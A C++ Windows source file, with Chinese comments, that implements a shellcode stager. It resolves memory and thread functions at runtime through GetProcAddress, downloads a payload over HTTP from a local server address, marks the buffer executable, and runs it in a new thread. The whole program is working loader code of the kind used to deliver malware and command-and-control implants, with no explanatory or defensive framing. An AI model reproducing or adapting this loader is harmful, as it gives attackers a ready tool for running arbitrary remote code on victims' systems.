#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <string>
#include <vector>
#include <regex>

class HttpRequest {
public:
    static bool ParseURL(const std::wstring& url, std::wstring& host, INTERNET_PORT& port, std::wstring& path)
    {
        std::wregex urlRegex(L"(http://|https://)?([^:/]+):?(\\d*)(/.*)?");
        std::wsmatch matches;

        if (std::regex_match(url, matches, urlRegex)) {
            host = matches[2].str();
            port = matches[3].length() > 0 ? std::stoi(matches[3].str()) : 80;
            path = matches[4].length() > 0 ? matches[4].str() : L"/";
            return true;
        }
        return false;
    }

    static HINTERNET OpenSession()
    {
        return WinHttpOpen(L"WinHTTP Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    }

    static HINTERNET ConnectToServer(HINTERNET hSession, const std::wstring& szServerName, INTERNET_PORT nServerPort)
    {
        return WinHttpConnect(hSession, szServerName.c_str(), nServerPort, 0);
    }

    static HINTERNET OpenRequest(HINTERNET hConnect, const std::wstring& szPath)
    {
        return WinHttpOpenRequest(hConnect, L"GET", szPath.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    }

    static bool SendRequest(HINTERNET hRequest)
    {
        return WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) != 0;
    }

    static bool ReceiveResponse(HINTERNET hRequest)
    {
        return WinHttpReceiveResponse(hRequest, NULL) != 0;
    }

    static void* ReadResponse(HINTERNET hRequest, void* lpAddress, SIZE_T sDataSize)
    {
        DWORD dwSize = 0;
        DWORD dwDownloaded = 0;
        DWORD_PTR hptr = reinterpret_cast<DWORD_PTR>(lpAddress);
        do
        {
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;

            std::vector<unsigned char> pszOutBuffer(dwSize + 1, 0);
            if (!WinHttpReadData(hRequest, pszOutBuffer.data(), dwSize, &dwDownloaded)) break;

            VxMoveMemory(reinterpret_cast<void*>(hptr), pszOutBuffer.data(), dwSize);
            hptr += dwSize;
        } while (dwSize > 0);
        return lpAddress;
    }

    static void CloseHandles(HINTERNET hRequest, HINTERNET hConnect, HINTERNET hSession)
    {
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);
    }

private:
    static void* VxMoveMemory(void* dest, const void* src, SIZE_T len)
    {
        char* d = static_cast<char*>(dest);
        const char* s = static_cast<const char*>(src);
        if (d < s)
            while (len--)
                *d++ = *s++;
        else
        {
            const char* lasts = s + (len - 1);
            char* lastd = d + (len - 1);
            while (len--)
                *lastd-- = *lasts--;
        }
        return dest;
    }
};

int main(int argc, char* argv[])
{
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");

    if (hKernel32 == NULL) {
        std::cerr << "Failed to get handle to kernel32.dll" << std::endl;
        return 1;
    }

    // 通过 GetProcAddress 获取函数指针
    auto pVirtualAlloc = reinterpret_cast<LPVOID(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD)>(GetProcAddress(hKernel32, "VirtualAlloc"));
    auto pVirtualFree = reinterpret_cast<BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD)>(GetProcAddress(hKernel32, "VirtualFree"));
    auto pVirtualProtect = reinterpret_cast<BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD)>(GetProcAddress(hKernel32, "VirtualProtect"));
    auto pCreateThread = reinterpret_cast<HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD)>(GetProcAddress(hKernel32, "CreateThread"));
    auto pWaitForSingleObject = reinterpret_cast<DWORD(WINAPI*)(HANDLE, DWORD)>(GetProcAddress(hKernel32, "WaitForSingleObject"));
    auto pCloseHandle = reinterpret_cast<BOOL(WINAPI*)(HANDLE)>(GetProcAddress(hKernel32, "CloseHandle"));

    HINTERNET hSession = nullptr, hConnect = nullptr, hRequest = nullptr;
    DWORD dwDataSize = 0;
    DWORD dwSize = sizeof(dwDataSize);

    std::wstring url = L"http://127.0.0.1:8181/test";
    std::wstring host, path;
    INTERNET_PORT port;

    if (!HttpRequest::ParseURL(url, host, port, path)) {
        std::cerr << "Failed to parse URL" << std::endl;
        return 1;
    }

    hSession = HttpRequest::OpenSession();
    if (hSession)
    {
        hConnect = HttpRequest::ConnectToServer(hSession, host, port);
        if (hConnect)
        {
            hRequest = HttpRequest::OpenRequest(hConnect, path);
            if (hRequest)
            {
                if (HttpRequest::SendRequest(hRequest) && HttpRequest::ReceiveResponse(hRequest))
                {
                    // 获取内容长度
                    if (WinHttpQueryHeaders(hRequest,
                        WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX,
                        &dwDataSize,
                        &dwSize,
                        NULL))
                    {
                        // 根据内容长度动态分配内存
                        LPVOID lpAddress = pVirtualAlloc(NULL, dwDataSize, MEM_COMMIT, PAGE_READWRITE);
                        if (lpAddress)
                        {
                            // 读取响应到内存
                            if (HttpRequest::ReadResponse(hRequest, lpAddress, dwDataSize))
                            {
                                DWORD ulOldProtect;
                                if (pVirtualProtect(lpAddress, dwDataSize, PAGE_EXECUTE_READ, &ulOldProtect))
                                {
                                    HANDLE hThread = pCreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(lpAddress), NULL, 0, NULL);
                                    pWaitForSingleObject(hThread, INFINITE);
                                    pCloseHandle(hThread);
                                }
                            }
                            // 释放读写内存
                            pVirtualFree(lpAddress, 0, MEM_RELEASE);
                        }
                    }
                }
            }
        }
    }

    // 关闭所有句柄
    HttpRequest::CloseHandles(hRequest, hConnect, hSession);

    return 0;
}